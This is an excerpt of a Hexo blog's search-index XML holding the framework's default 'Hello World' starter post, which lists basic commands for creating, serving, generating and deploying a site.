      <url>/2022/01/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
